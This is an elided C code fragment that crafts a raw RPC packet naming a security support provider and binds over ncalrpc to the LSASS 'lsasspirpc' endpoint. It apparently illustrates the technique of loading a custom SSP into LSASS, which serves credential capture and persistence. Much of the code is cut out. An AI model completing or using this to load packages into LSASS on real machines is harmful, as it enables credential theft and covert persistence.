...
int main(int argc, char** argv) {
	...
	packageName.Length = strlen(buffer) * 2;
	packageName.MaximumLength = (strlen(buffer) * 2) + 2;
	mbstowcs((wchar_t*)(rpcPacket + 0xd8), buffer, (sizeof(rpcPacket) - 0xd8) / 2);
	...
	*(unsigned long long*)((char*)rpcPacket + 0x48) = 0xd8;  // Offset to unicode ssp name
	...
	status = RpcStringBindingCompose(NULL,
		//reinterpret_cast <RPC_WSTR>((unsigned char*)"ncalrpc"),
		(RPC_WSTR)L"ncalrpc",
		NULL,
		//reinterpret_cast <RPC_WSTR>((unsigned char*)"lsasspirpc"),
